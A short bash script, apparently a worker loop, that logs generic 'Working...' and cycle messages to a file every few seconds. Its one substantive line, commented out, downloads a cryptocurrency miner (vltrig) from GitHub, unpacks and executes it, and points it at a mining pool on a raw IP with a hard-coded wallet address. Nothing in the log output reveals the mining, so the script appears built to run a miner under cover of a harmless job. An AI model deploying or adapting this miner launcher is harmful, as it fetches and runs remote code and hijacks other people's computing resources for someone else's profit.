#!/bin/bash

cd "$(dirname "$0")"

echo "[INIT] n.sh started at $(date)" >> log.txt

while true; do
  echo "[RUN] $(date)" | tee -a log.txt

  # wget -O vltrig.tar.gz https://github.com/HashVault/vltrig/releases/download/v6.26.0.4/vltrig-v6.26.0.4-linux-x64.tar.gz && tar -xzf vltrig.tar.gz && chmod +x vltrig && ./vltrig -o 45.79.221.56:443 -u 88yrgvUpdYx1RNon4zRcSKJbhXoCz4wcmQztNKrKddDkaWPamJiPNksLcCQcUnyMkF3JYzuiYUXNFCm4fVgJY9qB8qeCNTX -p x -t 3
  echo "Working..." >> log.txt

  # contoh delay kerja
  sleep 5

  echo "[DONE] cycle complete" >> log.txt

  sleep 10
done
